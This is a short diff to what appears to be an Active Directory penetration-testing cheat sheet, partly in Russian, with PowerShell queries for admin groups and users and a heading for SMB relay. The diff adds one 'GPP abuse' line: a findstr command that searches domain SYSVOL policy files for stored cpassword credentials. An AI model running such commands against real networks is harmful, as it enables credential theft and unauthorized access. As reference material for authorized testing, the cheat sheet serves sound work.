@@ -62,6 +62,8 @@ get-adgroup -filter{GroupCategory -eq 'Security' -AND Name -like "admin"}
 get-aduser -filter {AdminCount -eq 1} -Properties
 
 Поиск групп Active Directory
+
+GPP abuse: findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policy\*. xml
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## SMB Relay
